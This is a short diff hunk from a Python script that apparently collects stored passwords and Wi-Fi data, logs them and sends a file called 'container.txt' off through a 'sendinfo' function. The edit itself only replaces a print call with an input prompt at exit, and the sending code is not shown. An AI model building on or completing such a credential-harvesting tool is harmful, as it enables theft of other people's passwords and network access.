@@ -23,7 +23,7 @@ def main():
     log(passwords, wifidata)
     sendinfo("container.txt")
     concatenate(passwords, wifidata)
-    print("press any key to exit\n")
+    input("press any key to exit\n")
 def clean(dirtydata):
     #Does what its name says
     i = 0
